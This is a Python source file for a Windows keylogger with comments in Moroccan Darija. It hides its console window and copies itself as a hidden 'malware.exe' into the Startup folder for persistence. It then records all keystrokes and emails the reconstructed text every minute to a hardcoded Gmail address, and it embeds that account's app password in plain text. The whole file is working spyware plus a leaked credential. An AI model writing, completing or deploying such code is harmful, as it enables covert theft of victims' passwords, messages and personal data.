import os
import shutil
import time
import threading
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import ctypes  
import sys


kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
hwnd = kernel32.GetConsoleWindow()
if hwnd:
    user32.ShowWindow(hwnd, 0) 


logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")


EMAIL_ADDRESS = "tubg2980@gmail.com"  
EMAIL_PASSWORD = "figx aije plaj pbfw"  
RECIPIENT_EMAIL = "tubg2980@gmail.com"  
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# hadi bache yab9a f f systame
def persist():
    try:
        
        startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        location = os.path.join(startup_path, "malware.exe")
        if not os.path.exists(location):
            shutil.copyfile(sys.argv[0], location)
            os.system(f"attrib +h {location}")  
    except Exception as e:
        logging.error(f"Error persisting: {e}")


def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f"Key pressed: {key.char}")
        else:
            logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def format_logs(log_content):
    formatted_text = ""
    for line in log_content.splitlines():
        if "Key pressed:" in line:
            formatted_text += line.split("Key pressed: ")[1]
        elif "Special key pressed:" in line:
            key = line.split("Special key pressed: ")[1]
            if key == "Key.space":
                formatted_text += " "
            elif key == "Key.enter":
                formatted_text += "\n"
            elif key == "Key.backspace":
                formatted_text = formatted_text[:-1]  # إزالة الحرف الأخير
            elif key == "Key.tab":
                formatted_text += "\t"
    return formatted_text

def send_email():
    try:
        with open("keylog.txt", "r") as file:
            log_content = file.read()

        if not log_content.strip():
            return

        formatted_text = format_logs(log_content)

        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = "Keylog Data"
        msg.attach(MIMEText(formatted_text, 'plain'))

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())

        with open("keylog.txt", "w") as file:
            file.truncate(0)
    except Exception as e:
        logging.error(f"Error sending email: {e}")

# lahwayaje li kaso ydirha
def main():
    # installer f sys
    persist()

    # ybadi ykadame keylog
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    # bache i safatli f gmail l keylog
    while True:
        send_email()
        time.sleep(60)  # lwa9ta

if __name__ == "__main__":
    main()
